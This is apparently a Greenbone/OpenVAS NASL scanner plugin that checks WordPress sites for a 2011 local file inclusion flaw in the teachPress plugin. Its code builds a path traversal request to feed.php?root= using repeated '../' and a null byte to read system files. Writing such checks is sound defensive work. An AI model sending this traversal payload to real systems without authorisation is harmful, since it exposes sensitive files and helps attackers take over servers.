CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103303" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2011-10-18 13:33:12 +0200 (Tue, 18 Oct 2011)" );
	script_bugtraq_id( 50105 );
	script_tag( name: "cvss_base", value: "5.1" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:H/Au:N/C:P/I:P/A:P" );
	script_name( "WordPress teachPress 'root' Multiple Local File Include Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "secpod_wordpress_detect_900182.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/50105" );
	script_xref( name: "URL", value: "http://plugins.trac.wordpress.org/changeset/405672/teachpress/trunk/export.php?old=340149&old_path=teachpress%2Ftrunk%2Fexport.php" );
	script_xref( name: "URL", value: "http://plugins.trac.wordpress.org/changeset/405672/teachpress/trunk/feed.php?old=340149&old_path=teachpress%2Ftrunk%2Ffeed.php" );
	script_xref( name: "URL", value: "http://wordpress.org/extend/plugins/teachpress/" );
	script_tag( name: "summary", value: "The teachPress plug-in for WordPress is prone to multiple local file
  include vulnerabilities because it fails to adequately validate user-supplied input." );
	script_tag( name: "impact", value: "An attacker can exploit these vulnerabilities to obtain potentially
  sensitive information and execute arbitrary local scripts. This could allow the attacker to compromise
  the application and the computer. Other attacks are also possible." );
	script_tag( name: "affected", value: "teachPress 2.3.2 is vulnerable. Prior versions may also be affected." );
	script_tag( name: "solution", value: "Vendor updates are available. Please see the references for more
  information." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for file in keys( files ) {
	url = NASLString( dir, "/wp-content/plugins/teachpress/feed.php?root=", crap( data: "../", length: 9 * 3 ), files[file], "%00" );
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

